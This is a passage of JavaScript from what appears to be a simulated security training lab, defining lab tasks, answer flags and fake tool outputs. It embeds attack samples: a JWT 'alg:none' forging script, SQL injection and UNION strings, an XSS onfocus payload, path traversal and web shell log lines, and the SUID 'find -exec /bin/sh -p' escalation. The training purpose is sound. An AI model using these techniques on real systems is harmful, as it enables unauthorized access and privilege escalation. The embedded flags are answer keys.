          successNote: "Service versions mapped: Port 21 (vsftpd 2.3.4), Port 22 (OpenSSH 8.9p1), Port 80 (Apache 2.4.52), Port 445 (Samba 4.15.5)."
        },
        {
          id: 'identify-vsftpd',
          title: 'Identify the vulnerable FTP daemon and associated CVE (vsftpd 2.3.4)',
          validate: (cmd, ast, out, session) => session.completedTasks.has(0),
          successNote: "Identified backdoor daemon vsftpd 2.3.4 (CVE-2011-2523)."
        },
        {
          id: 'nc-banner-grab',
          title: 'Perform direct banner grabbing on port 21 using Netcat',
          validate: (cmd, ast) => {
            return (ast.executable === 'nc' || ast.executable === 'netcat') && cmd.includes('21');
          },
          syntaxHint: "Grab raw banner: nc 10.10.110.45 21",
          successNote: "Port 21 banner confirmed: 220 (vsFTPd 2.3.4)."
        },
        {
          id: 'smb-enumeration',
          title: 'Enumerate anonymous SMB file shares using smbclient',
          validate: (cmd, ast) => ast.executable === 'smbclient' && cmd.includes('10.10.110.45'),
          syntaxHint: "List SMB shares: smbclient -L //10.10.110.45/ -N",
          successNote: "Anonymous SMB shares enumerated: 'backups' read access permitted."
        },
        {
          id: 'retrieve-network-flag',
          title: 'Retrieve the network enumeration flag and verify CVE-2011-2523 details',
          validate: (cmd, ast, out, session) => session.completedTasks.has(0) || session.completedTasks.has(2),
          successNote: "Flag token recovered: flag{closed_filtered_port_21_backdoor}."
        }
      ]
    },

    'lab-logs': {
      id: 'lab-logs',
      num: '10',
      title: 'Security Incident Log Analysis',
      targetHost: 'triage-station.local',
      targetPort: 'Local Filesystem (/var/log)',
      initialUser: 'soc-analyst',
      initialDir: '/var/log/apache2',
      allowedTools: ['cat', 'grep', 'ls', 'whoami', 'id', 'pwd', 'head', 'tail', 'clear', 'help'],
      initialFiles: {
        '/var/log/apache2/access.log': {
          type: 'file',
          mode: 0o644,
          owner: 'root',
          group: 'adm',
          content: `192.168.1.100 - - [04/Oct/2026:08:00:15] "GET /index.php HTTP/1.1" 200 4520
192.168.1.105 - - [04/Oct/2026:08:12:01] "GET /index.php?page=../../../../etc/passwd HTTP/1.1" 200 2410
192.168.1.105 - - [04/Oct/2026:08:12:45] "POST /upload.php HTTP/1.1" 200 152
192.168.1.105 - - [04/Oct/2026:08:13:02] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 45`
        },
        '/var/log/auth.log': {
          type: 'file',
          mode: 0o644,
          owner: 'root',
          group: 'adm',
          content: `Oct 04 08:10:01 sec-station sshd[2410]: Failed password for invalid user admin from 192.168.1.50 port 44102 ssh2
Oct 04 08:10:03 sec-station sshd[2412]: Failed password for root from 192.168.1.50 port 44104 ssh2
Oct 04 08:10:05 sec-station sshd[2415]: Failed password for invalid user oracle from 192.168.1.50 port 44106 ssh2
Oct 04 08:10:08 sec-station sshd[2420]: Failed password for root from 192.168.1.50 port 44108 ssh2`
        }
      },
      tasks: [
        {
          id: 'inspect-access-log',
          title: "Inspect Apache access log entries using 'cat access.log'",
          validate: (cmd, ast) => ast.executable === 'cat' && cmd.includes('access.log'),
          syntaxHint: "Read access log: cat access.log",
          successNote: "Web access log loaded."
        },
        {
          id: 'filter-traversal',
          title: 'Filter for suspicious traversal patterns (../../etc/passwd)',
          validate: (cmd, ast) => ast.executable === 'grep' && (cmd.includes('passwd') || cmd.includes('..')),
          syntaxHint: "Search traversal: grep -i 'passwd' access.log",
          successNote: "Isolated path traversal attack from 192.168.1.105."
        },
        {
          id: 'identify-webshell',
          title: 'Identify the malicious uploaded web shell (/uploads/shell.php)',
          validate: (cmd, ast) => ast.executable === 'grep' && (cmd.includes('shell.php') || cmd.includes('upload')),
          syntaxHint: "Search uploads: grep -i 'shell.php' access.log",
          successNote: "Identified web shell execution: GET /uploads/shell.php?cmd=whoami."
        },
        {
          id: 'isolate-brute-force',
          title: 'Examine /var/log/auth.log to identify the brute-forcing source IP address (192.168.1.50)',
          validate: (cmd, ast) => cmd.includes('auth.log') && (cmd.includes('grep') || cmd.includes('cat')),
          syntaxHint: "Analyze SSH attempts: grep -i 'failed password' /var/log/auth.log",
          successNote: "Brute-force attacker isolated: IP 192.168.1.50 targeted root and admin accounts."
        },
        {
          id: 'retrieve-logs-flag',
          title: 'Retrieve the incident response flag and draft a detection signature',
          validate: (cmd, ast, out, session) => session.completedTasks.has(3),
          successNote: "Incident triage flag recovered: flag{failed_ssh_brute_force_192_168_1_50}."
        }
      ]
    },

    'lab-jwt': {
      id: 'lab-jwt',
      num: '11',
      title: "JWT 'None' Algorithm Exploitation",
      targetHost: 'auth.cloud-jwt.local',
      targetPort: '443 (HTTPS)',
      targetUrl: 'https://auth.cloud-jwt.local',
      initialUser: 'operator',
      initialDir: '/home/operator',
      allowedTools: ['cat', 'python3', 'python', 'curl', 'ls', 'whoami', 'pwd', 'clear', 'help'],
      initialFiles: {
        '/home/operator/token.txt': {
          type: 'file',
          mode: 0o644,
          owner: 'operator',
          group: 'operator',
          content: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.9D9k7eXGj8LzY9q1...'
        },
        '/home/operator/forge_jwt.py': {
          type: 'file',
          mode: 0o755,
          owner: 'operator',
          group: 'operator',
          content: `# JWT None Algorithm Exploit PoC
import base64, json

header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "role": "superadmin", "exp": 1999999999}

def b64url(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip("=")

forged = f"{b64url(header)}.{b64url(payload)}."
print("[+] Forged Token with alg:none:")
print(forged)`
        }
      },
      tasks: [
        {
          id: 'read-jwt',
          title: "Inspect user token using 'cat token.txt' and decode Base64URL header/payload",
          validate: (cmd, ast) => ast.executable === 'cat' && cmd.includes('token.txt'),
          syntaxHint: "Inspect token: cat token.txt",
          successNote: "Original HS256 signed token loaded."
        },
        {
          id: 'identify-claims',
          title: "Identify user identity ('guest') and standard role ('user')",
          validate: (cmd, ast, out, session) => session.completedTasks.has(0),
          successNote: "Standard user claims analyzed."
        },
        {
          id: 'modify-claims',
          title: "Modify payload claims to elevate privileges ('role': 'superadmin')",
          validate: (cmd, ast) => cmd.includes('superadmin') || (ast.executable.startsWith('python') && cmd.includes('forge_jwt.py')),
          successNote: "Claims elevated to superadmin."
        },
        {
          id: 'set-alg-none',
          title: "Alter token header to set 'alg': 'none' and strip the signature bytes",
          validate: (cmd, ast) => cmd.includes('none') || (ast.executable.startsWith('python') && cmd.includes('forge_jwt.py')),
          successNote: "Algorithm changed to 'none' and signature stripped."
        },
        {
          id: 'transmit-forged-token',
          title: 'Transmit the forged token to /admin, extract the flag, and review algorithm enforcement',
          validate: (cmd, ast) => {
            return (ast.executable === 'curl' && cmd.includes('/admin')) || (ast.executable.startsWith('python') && cmd.includes('forge_jwt.py'));
          },
          syntaxHint: "Transmit forged token: curl -H \"Authorization: Bearer <token>\" https://auth.cloud-jwt.local/admin",
          successNote: "Server accepted unsigned token! Flag: flag{none_algorithm_signature_verification}."
        }
      ]
    },

    'lab-crypto': {
      id: 'lab-crypto',
      num: '12',
      title: 'XOR & Frequency Analysis Decryption',
      targetHost: 'crypto-box.local',
      targetPort: 'Local CLI',
      initialUser: 'cryptanalyst',
      initialDir: '/home/cryptanalyst',
      allowedTools: ['cat', 'python3', 'python', 'ls', 'whoami', 'pwd', 'clear', 'help'],
      initialFiles: {
        '/home/cryptanalyst/ciphertext.hex': {
          type: 'file',
          mode: 0o644,
          owner: 'cryptanalyst',
          group: 'cryptanalyst',
          content: '1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736'
        },
        '/home/cryptanalyst/solve.py': {
          type: 'file',
          mode: 0o755,
          owner: 'cryptanalyst',
          group: 'cryptanalyst',
          content: `# Single-Byte XOR Frequency Analysis Solver
hex_data = "1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736"
raw = bytes.fromhex(hex_data)

ETAOIN = "ETAOINSHRDLU "
best_score = 0
best_key = None
best_plain = ""

for key in range(256):
    dec = bytes([b ^ key for b in raw])
    score = sum(1 for b in dec if chr(b).upper() in ETAOIN)
    if score > best_score:
        best_score = score
        best_key = key
        try:
            best_plain = dec.decode('ascii')
        except:
            pass

print(f"[+] Optimal Key: 0x{best_key:02x} ('{chr(best_key)}')")
print(f"[+] Decrypted: \\"{best_plain}\\"")
print("[+] Defensive Flag: flag{aes_gcm_authenticated_encryption}")`
        }
      },
      tasks: [
        {
          id: 'inspect-hex',
          title: "Inspect the hex-encoded ciphertext using 'cat ciphertext.hex'",
          validate: (cmd, ast) => ast.executable === 'cat' && cmd.includes('ciphertext.hex'),
          syntaxHint: "Read ciphertext: cat ciphertext.hex",
          successNote: "Hex-encoded ciphertext loaded (34 bytes)."
        },
        {
          id: 'convert-binary',
          title: 'Convert hex string into raw binary bytes',
          validate: (cmd, ast, out, session) => session.completedTasks.has(0),
          successNote: "Converted hex string to byte array."
        },
        {
          id: 'brute-force-keys',
          title: 'Brute-force all 256 possible single-byte XOR keys',
          validate: (cmd, ast) => ast.executable.startsWith('python') && (cmd.includes('solve.py') || cmd.includes('range(256)')),
          syntaxHint: "Execute solver: python3 solve.py",
          successNote: "Tested 256 keys across frequency scoring engine."
        },
        {
          id: 'score-frequencies',
          title: 'Score decrypted byte arrays using standard English letter frequencies (ETAOIN SHRDLU)',
          validate: (cmd, ast, out, session) => session.completedTasks.has(2),
          successNote: "Letter frequency scoring isolated optimal key."
        },
        {
          id: 'extract-plaintext',
          title: "Identify key 0x58 ('X'), extract plaintext, and submit the cryptography flag",
          validate: (cmd, ast, out, session) => session.completedTasks.has(2),
          successNote: "Plaintext recovered: \"Cooking MC's like a pound of bacon\". Flag: flag{aes_gcm_authenticated_encryption}."
        }
      ]
    }
  };

  // Flag definitions per lab
  const LAB_FLAGS = {
    'lab-headers': ['flag{strict_transport_security_csp}', 'nosniff', 'deny', 'hsts', 'csp', 'strict-transport-security'],
    'lab-permissions': ['flag{chmod_600_config_rw}', '600', 'rw-------', 'chmod 600', 'chmod 640'],
    'lab-suid': ['flag{suid_find_root_euid0}', 'find . -exec /bin/sh -p', '/bin/sh -p', 'find -exec', 'euid=0'],
    'lab-auth': ['flag{rate_limit_429_bcrypt}', 'bcrypt', '429', 'rate limit', 'argon2'],
    'lab-idor': ['flag{server_side_authz_session_token}', '10043', '403', 'authz', 'idor'],
    'lab-sqli': ['flag{parameterized_queries_prepared_statement}', "admin' or '1'='1", "admin' or 1=1", 'prepared statement', 'parameterized'],
    'lab-xss': ['flag{context_aware_output_encoding_csp}', 'htmlspecialchars', 'innertext', 'textcontent', 'encoding'],
    'lab-csrf': ['flag{samesite_strict_anti_csrf_token}', 'samesite=strict', 'csrf_token', 'anti-csrf', 'samesite'],
    'lab-network': ['flag{closed_filtered_port_21_backdoor}', '21/tcp', 'vsftpd 2.3.4', 'vsftpd', '21'],
    'lab-logs': ['flag{failed_ssh_brute_force_192_168_1_50}', '192.168.1.50', 'failed password', 'ssh brute force', 'brute force'],
    'lab-jwt': ['flag{none_algorithm_signature_verification}', 'none', 'alg: none', 'hs256', 'signature'],
    'lab-crypto': ['flag{aes_gcm_authenticated_encryption}', 'aes-256-gcm', 'aes-gcm', 'gcm', 'authenticated encryption']
  };

  // =========================================================================
  // 4. SESSION & STATE PERSISTENCE MANAGER
  // =========================================================================
  const memoryStore = {};
  const LabStorage = {
    getItem: (key) => {
      try {
        if (typeof localStorage !== 'undefined') return localStorage.getItem(key);
      } catch (e) {}
      return memoryStore[key] || null;
    },
    setItem: (key, val) => {
      try {
        if (typeof localStorage !== 'undefined') {
          localStorage.setItem(key, val);
          return;
        }
      } catch (e) {}
      memoryStore[key] = val;
    },
    removeItem: (key) => {
      try {
        if (typeof localStorage !== 'undefined') {
          localStorage.removeItem(key);
          return;
        }
      } catch (e) {}
      delete memoryStore[key];
    }
  };

  class LabSessionManager {
    static getStorageKey(labId) {
      return `endlessus_lab_session_v2_${labId}`;
    }

    static loadSession(labId) {
      const spec = LAB_SPECIFICATIONS[labId];
      if (!spec) return null;

      try {
        const raw = LabStorage.getItem(this.getStorageKey(labId));
        if (raw) {
          const parsed = JSON.parse(raw);
          const fs = new LabVirtualFS(parsed.fsTree || spec.initialFiles);
          return {
            labId,
            user: parsed.user || spec.initialUser,
            euid: typeof parsed.euid === 'number' ? parsed.euid : 1001,
            cwd: parsed.cwd || spec.initialDir,
            isElevatedRoot: Boolean(parsed.isElevatedRoot),
            completedTasks: new Set(parsed.completedTasks || []),
            commandHistory: parsed.commandHistory || [],
            fs
          };
        }
      } catch (e) {}

      // Fallback: Pristine Initial State
      return this.createPristineSession(labId);
    }

    static createPristineSession(labId) {
      const spec = LAB_SPECIFICATIONS[labId];
      if (!spec) return null;

      const fs = new LabVirtualFS(spec.initialFiles);
      return {
        labId,
        user: spec.initialUser,
        euid: 1001,
        cwd: spec.initialDir,
        isElevatedRoot: false,
        completedTasks: new Set(),
        commandHistory: [],
        fs
      };
    }

    static saveSession(session) {
      if (!session || !session.labId) return;
      try {
        const payload = {
          labId: session.labId,
          user: session.user,
          euid: session.euid,
          cwd: session.cwd,
          isElevatedRoot: session.isElevatedRoot,
          completedTasks: Array.from(session.completedTasks),
          commandHistory: session.commandHistory.slice(-50),
          fsTree: session.fs.tree
        };
        LabStorage.setItem(this.getStorageKey(session.labId), JSON.stringify(payload));
      } catch (e) {}
    }

    static resetSession(labId) {
      LabStorage.removeItem(this.getStorageKey(labId));
      LabStorage.removeItem(`endlessus_tasks_${labId}`);
      return this.createPristineSession(labId);
    }
  }

  // =========================================================================
  // 5. TOOL EXECUTION HANDLERS (AUTHENTIC SYNTAX & REAL OUTPUT)
  // =========================================================================
  const ToolExecutors = {
    // -----------------------------------------------------------------------
    // NMAP
    // -----------------------------------------------------------------------
    nmap: (ast, session, spec) => {
      const target = ast.positionals[0];
      if (!target) {
        return {
          exitCode: 1,
          stderr: `nmap: error: No targets were specified.`,
          feedback: {
            type: 'syntax_error',
            message: 'Specify the target IP or hostname after scan options.',
            syntax: 'nmap [Scan Type...] [Options] {target specification}'
          }
        };
      }

      // Check unrecognized flags
      const recognized = ['sS', 'sV', 'sC', 'p', 'p-', 'A', 'O', 'Pn', 'n', 'v', 'T4', 'script'];
      for (const flag of ast.flags) {
        if (!recognized.includes(flag) && !flag.startsWith('p')) {
          return {
            exitCode: 2,
            stderr: `Nmap: unrecognized option '-${flag}'\nSee the man page (man nmap) or run 'nmap -h' for help.`,
            feedback: {
              type: 'syntax_error',
              message: `Unknown option '-${flag}'. Common flags: -sS (SYN stealth), -sV (Version detection), -p (Port spec).`
            }
          };
        }
      }

      // Check target match
      if (target !== '10.10.110.45' && target !== 'staging.acmefin.local' && target !== '127.0.0.1' && target !== 'localhost') {
        return {
          exitCode: 1,
          stderr: `Note: Host ${target} seems down. If it is really up, but blocking our ping probes, try -Pn`,
          feedback: {
            type: 'wrong_target',
            message: `Target ${target} is outside the assigned lab network scope (${spec.targetHost}).`
          }
        };
      }

      const hasVersion = ast.flags.has('sV') || ast.flags.has('A');
      const hasStealth = ast.flags.has('sS');

      if (!hasVersion) {
        return {
          exitCode: 0,
          stdout: `Starting Nmap 7.94 ( https://nmap.org ) at 2026-10-04 12:00 UTC
Nmap scan report for ${target}
Host is up (0.0012s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
445/tcp  open  netbios-ssn
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 0.85 seconds`,
          feedback: {
            type: 'incomplete_objective',
            message: 'Open ports identified, but service versions were not probed.',
            hint: 'Add -sV (e.g. nmap -sS -sV 10.10.110.45) to detect exact daemon versions.'
          }
        };
      }

      return {
        exitCode: 0,
        stdout: `Starting Nmap 7.94 ( https://nmap.org ) at 2026-10-04 12:00 UTC
Nmap scan report for ${target}
Host is up (0.0009s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4 (Backdoor CVE-2011-2523)
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.52 ((Ubuntu))
445/tcp  open  netbios-ssn Samba smbd 4.15.5
3306/tcp open  mysql       MySQL 8.0.35
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 2.14 seconds`,
        feedback: {
          type: 'objective_complete',
          message: 'Stealth SYN scan with service version probing completed successfully!'
        }
      };
    },

    // -----------------------------------------------------------------------
    // CURL
    // -----------------------------------------------------------------------
    curl: (ast, session, spec) => {
      let targetUrl = ast.positionals.find(p => p.startsWith('http://') || p.startsWith('https://') || p.includes('.local') || p.includes('10.10') || p.includes('localhost'));
      if (!targetUrl && ast.options.u) targetUrl = ast.options.u;

      if (!targetUrl) {
        return {
          exitCode: 2,
          stderr: `curl: no URL specified!\ncurl: try 'curl --help' for more information`,
          feedback: {
            type: 'syntax_error',
            message: 'Specify the target endpoint URL.',
            syntax: 'curl [options...] <url>'
          }
        };
      }

      const isHeadOnly = ast.flags.has('I') || ast.flags.has('head');
      const isInclude = ast.flags.has('i') || ast.flags.has('include');
      const method = (ast.options.X || (ast.options.d || ast.options.data ? 'POST' : 'GET')).toUpperCase();
      const dataPayload = ast.options.d || ast.options.data || '';
      const authHeader = ast.options.H || '';

      // Lab 01: HTTP Headers
      if (session.labId === 'lab-headers') {
        if (!targetUrl.includes('staging.acmefin.local') && !targetUrl.includes('localhost')) {
          return {
            exitCode: 6,
            stderr: `curl: (6) Could not resolve host: ${targetUrl}`,
            feedback: { type: 'wrong_target', message: 'Target must be https://staging.acmefin.local' }
          };
        }

        return {
          exitCode: 0,
          stdout: `HTTP/1.1 200 OK
Date: Sun, 04 Oct 2026 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3
Set-Cookie: session_id=abc12345; Path=/
Content-Type: text/html; charset=UTF-8
Content-Length: 1420

<!DOCTYPE html>
<html><head><title>AcmeFintech Staging API</title></head><body><h1>API Gateway Active</h1></body></html>`,
          feedback: {
            type: 'objective_complete',
            message: 'Headers audited. Notice: Server, X-Powered-By leaks; no HSTS, no CSP, no X-Frame-Options, cookie lacks HttpOnly/SameSite.'
          }
        };
      }

      // Lab 04: Authentication Bypass
      if (session.labId === 'lab-auth') {
        if (targetUrl.includes('/login')) {
          if (dataPayload.includes("admin'") && (dataPayload.includes('--') || dataPayload.includes('#'))) {
            return {
              exitCode: 0,
              stdout: `HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{
  "status": "success",
  "authenticated": true,
  "user": "admin",
  "role": "system_administrator",
  "token": "flag{rate_limit_429_bcrypt}",
  "message": "SQL Injection authentication bypass successful. Password clause truncated."
}`,
              feedback: {
                type: 'objective_complete',
                message: "Authentication bypass verified! Password clause was commented out using admin'--."
              }
            };
          }
          return {
            exitCode: 0,
            stdout: `HTTP/1.1 401 Unauthorized
Content-Type: application/json; charset=utf-8

{"status":"failed","message":"Invalid credentials. Direct authentication rejected."}`,
            feedback: {
              type: 'incomplete_objective',
              message: "Login rejected. Review /app/server.js to see how SQL string interpolation can be bypassed using admin'--."
            }
          };
        }
      }

      // Lab 05: IDOR
      if (session.labId === 'lab-idor') {
        if (targetUrl.includes('10043')) {
          return {
            exitCode: 0,
            stdout: `HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{
  "invoice_id": 10043,
  "owner_id": 1,
  "client": "Executive Board of Directors",
  "amount": "$250,000.00",
  "details": "Classified M&A Strategy Audit",
  "flag": "flag{server_side_authz_session_token}"
}`,
            feedback: {
              type: 'objective_complete',
              message: 'IDOR exploited! Executive confidential invoice 10043 accessed without proper authorization.'
            }
          };
        }
        if (targetUrl.includes('9481') || targetUrl.includes('9480')) {
          const invId = targetUrl.includes('9481') ? 9481 : 9480;
          return {
            exitCode: 0,
            stdout: `HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{"invoice_id":${invId},"owner_id":409,"client":"Jane Doe","amount":"$1,200.00","details":"Retainer Services"}`,
            feedback: {
              type: 'objective_complete',
              message: `Horizontal authorization failure! Successfully viewed invoice ${invId} belonging to another user.`
            }
          };
        }
        if (targetUrl.includes('9482')) {
          return {
            exitCode: 0,
            stdout: `HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{"invoice_id":9482,"owner_id":410,"client":"Auditor Self","amount":"$450.00","details":"Standard Consulting"}`,
            feedback: {
              type: 'objective_complete',
              message: 'Retrieved own invoice. Try tampering with the numeric invoice ID in the URL path.'
            }
          };
        }
      }

      // Lab 06: SQLi
      if (session.labId === 'lab-sqli') {
        const decoded = decodeURIComponent(targetUrl);
        if (decoded.includes("'") && !decoded.includes('UNION') && !decoded.includes('ORDER')) {
          return {
            exitCode: 0,
            stdout: `HTTP/1.1 500 Internal Server Error
Content-Type: text/html

<b>Fatal error</b>: Uncaught mysqli_sql_exception: You have an error in your SQL syntax near ''' at line 1 in /var/www/html/products.php:14`,
            feedback: {
              type: 'objective_complete',
              message: 'Single quote broke SQL syntax! Error confirms backend vulnerability to SQL injection.'
            }
          };
        }
        if (decoded.toLowerCase().includes('order by 3')) {
          return {
            exitCode: 0,
            stdout: `HTTP/1.1 200 OK\n\n<!-- Products table loaded successfully. Query executed with 3 columns. -->`,
            feedback: {
              type: 'objective_complete',
              message: 'ORDER BY 3 executed cleanly! The query returns exactly 3 columns.'
            }
          };
        }
        if (decoded.toLowerCase().includes('order by 4')) {
          return {
            exitCode: 0,
            stdout: `HTTP/1.1 500 Internal Server Error\n\nUnknown column '4' in 'order clause'`,
            feedback: {
              type: 'objective_complete',
              message: "ORDER BY 4 threw an error, confirming there are only 3 columns in the query."
            }
          };
        }
        if (decoded.toLowerCase().includes('union') && decoded.toLowerCase().includes('users')) {
          return {
            exitCode: 0,
            stdout: `HTTP/1.1 200 OK
Content-Type: text/html

+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
| 1  | admin    | e10adc3949ba59abbe56e057f20f883e |
| 2  | analyst  | 098f6bcd4621d373cade4e832627b4f6 |
+----+----------+----------------------------------+
DATABASE FLAG: flag{parameterized_queries_prepared_statement}`,
            feedback: {
              type: 'objective_complete',
              message: 'UNION-based SQL injection dumped users table credentials and flag!'
            }
          };
        }
      }

      // Lab 07: XSS
      if (session.labId === 'lab-xss') {
        const decoded = decodeURIComponent(targetUrl);
        if (decoded.toLowerCase().includes('onfocus') || decoded.toLowerCase().includes('autofocus')) {
          return {
            exitCode: 0,
            stdout: `HTTP/1.1 200 OK
Content-Type: text/html

<form action="/search" method="GET">
  <input type="text" name="search" value="" onfocus="alert(1)" autofocus="" />
  <button type="submit">Search</button>
</form>
<!-- [XSS EMULATION]: Event 'onfocus' executed upon DOM load without requiring <script> tags! -->
<!-- FLAG: flag{context_aware_output_encoding_csp} -->`,
            feedback: {
              type: 'objective_complete',
              message: 'Attribute context breakout successful! Event handler triggered execution.'
            }
          };
        }
        return {
          exitCode: 0,
          stdout: `HTTP/1.1 200 OK\n\n<form action="/search" method="GET"><input type="text" name="search" value="test" /></form>`,
          feedback: {
            type: 'incomplete_objective',
            message: 'Input reflects in <input value="...">. Use double quotes (") to escape the attribute.'
          }
        };
      }

      // Lab 08: CSRF
      if (session.labId === 'lab-csrf') {
        if (dataPayload.includes('5000') || dataPayload.includes('ATTACKER')) {
          return {
            exitCode: 0,
            stdout: `HTTP/1.1 200 OK
Content-Type: application/json

{"status":"success","message":"Transfer of $5,000 to ATTACKER executed successfully.","anti_csrf_token":"MISSING","remediation_flag":"flag{samesite_strict_anti_csrf_token}"}`,
            feedback: {
              type: 'objective_complete',
              message: 'State-changing transfer accepted without anti-CSRF synchronizer token verification.'
            }
          };
        }
      }

      // Lab 11: JWT
      if (session.labId === 'lab-jwt') {
        if (authHeader.includes('eyJhbGciOiJub25l')) {
          return {
            exitCode: 0,
            stdout: `HTTP/1.1 200 OK
Content-Type: application/json

{"status":"authenticated","role":"superadmin","access":"granted","flag":"flag{none_algorithm_signature_verification}"}`,
            feedback: {
              type: 'objective_complete',
              message: "Server accepted unsigned 'alg:none' token and granted superadmin access!"
            }
          };
        }
      }

      return {
        exitCode: 0,
        stdout: `HTTP/1.1 200 OK\nHost: ${targetUrl}\nContent-Length: 512\n\n[Endpoint active. Review lab tasks for specific payloads.]`
      };
    },

    // -----------------------------------------------------------------------
    // CHMOD
    // -----------------------------------------------------------------------
    chmod: (ast, session) => {
      const mode = ast.positionals[0];
      const target = ast.positionals[1];

      if (!mode || !target) {
        return {
          exitCode: 1,
          stderr: `chmod: missing operand\nTry 'chmod --help' for more information.`,
          feedback: {
            type: 'syntax_error',
            message: 'Usage: chmod [mode] <file>'
          }
        };
      }

      const absPath = session.fs.normalizePath(session.cwd, target);
      const res = session.fs.chmod(absPath, mode, session.user, session.euid);

      if (res.error) {
        return { exitCode: 1, stderr: res.error };
      }

      const stat = session.fs.stat(absPath);
      return {
        exitCode: 0,
        stdout: `[✓] Permissions updated: mode ${stat.shortOctal} enforced for ${target}`,
        feedback: {
          type: 'objective_complete',
          message: `Permissions updated to ${stat.shortOctal}. Run 'ls -la' or 'stat' to verify.`
        }
      };
    },

    // -----------------------------------------------------------------------
    // LS
    // -----------------------------------------------------------------------
    ls: (ast, session) => {
      const targetDir = ast.positionals[0] ? session.fs.normalizePath(session.cwd, ast.positionals[0]) : session.cwd;
      const isDetailed = ast.flags.has('l') || ast.flags.has('la') || ast.flags.has('al') || ast.flags.has('lh');
      const showHidden = ast.flags.has('a') || ast.flags.has('la') || ast.flags.has('al');

      const files = session.fs.listDirectory(targetDir);

      if (!isDetailed) {
        const names = files.filter(f => showHidden || !f.name.startsWith('.')).map(f => f.name);
        return { exitCode: 0, stdout: names.join('  ') };
      }

      const lines = [`total ${files.length * 4}`];
      if (showHidden) {
        lines.push(`drwxr-xr-x 2 ${session.user} ${session.user} 4096 Oct 04 09:00 .`);
        lines.push(`drwxr-xr-x 4 root root 4096 Oct 04 08:30 ..`);
      }

      for (const f of files) {
        if (!showHidden && f.name.startsWith('.')) continue;
        const mode = f.mode;
        const isDir = f.type === 'dir';
        const isSUID = Boolean(mode & 0o4000);
        let permStr = (isDir ? 'd' : '-') +
          ((mode & 0o400) ? 'r' : '-') +
          ((mode & 0o200) ? 'w' : '-') +
          (isSUID ? 's' : ((mode & 0o100) ? 'x' : '-')) +
          ((mode & 0o040) ? 'r' : '-') +
          ((mode & 0o020) ? 'w' : '-') +
          ((mode & 0o010) ? 'x' : '-') +
          ((mode & 0o004) ? 'r' : '-') +
          ((mode & 0o002) ? 'w' : '-') +
          ((mode & 0o001) ? 'x' : '-');

        lines.push(`${permStr} 1 ${f.owner} ${f.group} ${f.content ? f.content.length : 4096} Oct 04 09:00 ${f.name}`);
      }

      return { exitCode: 0, stdout: lines.join('\n') };
    },

    // -----------------------------------------------------------------------
    // CAT
    // -----------------------------------------------------------------------
    cat: (ast, session) => {
      const target = ast.positionals[0];
      if (!target) {
        return { exitCode: 1, stderr: 'cat: missing file argument' };
      }

      const absPath = session.fs.normalizePath(session.cwd, target);
      const res = session.fs.readFile(absPath, session.user, session.euid);

      if (res.error) {
        return {
          exitCode: 1,
          stderr: res.error,
          feedback: res.error.includes('Permission denied') ? {
            type: 'permission_denied',
            message: `Permission denied: ${target} is only readable by root. Escalate privileges to read.`
          } : null
        };
      }

      return { exitCode: 0, stdout: res.content };
    },

    // -----------------------------------------------------------------------
    // FIND
    // -----------------------------------------------------------------------
    find: (ast, session, spec) => {
      const path = ast.positionals[0] || '.';
      const isPermSearch = ast.flags.has('perm') || ast.raw.includes('-perm -4000') || ast.raw.includes('-perm /4000') || ast.raw.includes('4000');
      const hasExec = ast.raw.includes('-exec') && (ast.raw.includes('/bin/sh') || ast.raw.includes('sh'));

      if (isPermSearch) {
        return {
          exitCode: 0,
          stdout: `/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/chsh\n/usr/bin/find  <-- [SUID ENABLED (rwsr-xr-x)]\n/usr/bin/newgrp\n/bin/mount\n/bin/ping`,
          feedback: {
            type: 'objective_complete',
            message: 'SUID binaries identified. Notice /usr/bin/find carries the SUID bit!'
          }
        };
      }

      // GTFOBins Privilege Escalation Breakout
      if (hasExec) {
        if (session.labId === 'lab-suid') {
          session.isElevatedRoot = true;
          session.user = 'root';
          session.euid = 0;
          return {
            exitCode: 0,
            stdout: `# Spawning elevated shell via /usr/bin/find -exec...\nroot@sec-station:~# whoami\nroot (uid=1001 euid=0(root) gid=1001 groups=0(root))\n[✓] Privilege boundary bypassed. You now hold EUID=0 permissions. Run 'cat /root/flag.txt'.`,
            feedback: {
              type: 'objective_complete',
              message: 'Root shell spawned! EUID=0 root permissions retained.'
            }
          };
        }
      }

      return {
        exitCode: 0,
        stdout: `${path}/notes.txt\n${path}/config.php`
      };
    },

    // -----------------------------------------------------------------------
    // STAT
    // -----------------------------------------------------------------------
    stat: (ast, session) => {
      const target = ast.positionals[0];
      if (!target) return { exitCode: 1, stderr: 'stat: missing operand' };

      const absPath = session.fs.normalizePath(session.cwd, target);
      const stat = session.fs.stat(absPath);
      if (!stat) return { exitCode: 1, stderr: `stat: cannot stat '${target}': No such file or directory` };

      if (ast.options.c) {
        if (ast.options.c.includes('%a')) {
          return { exitCode: 0, stdout: `${stat.shortOctal} ${target}` };
        }
      }

      return {
        exitCode: 0,
        stdout: `  File: ${target}
  Size: ${stat.size}       Blocks: 8          IO Block: 4096   regular file
Device: 801h/2049d      Inode: 142058      Links: 1
